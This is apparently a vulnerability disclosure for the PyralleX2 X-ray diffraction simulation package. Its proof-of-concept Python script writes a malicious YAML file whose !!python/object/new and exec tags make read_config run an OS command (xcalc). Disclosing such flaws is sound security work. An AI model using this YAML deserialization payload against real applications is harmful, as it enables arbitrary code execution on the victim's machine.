# :book: Description

`PyralleX2` A simulation suite for X-ray diffraction experiments, this package is vulnerable for `arbitaryCodeexecution`

https://github.com/MasterVexillen/PyralleX2

# :recycle:  Steps To Reproduce-:  
  0) `git clone https://github.com/MasterVexillen/PyralleX2`
  1) run as in poc.png
  poc.py 
```
from src.PyralleX2.params import *

payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""

open('payload.yaml','w+').write(payload)

read_config('payload.yaml')
```
# :telescope: POC


## 💥 Impact
Arbitary code execution
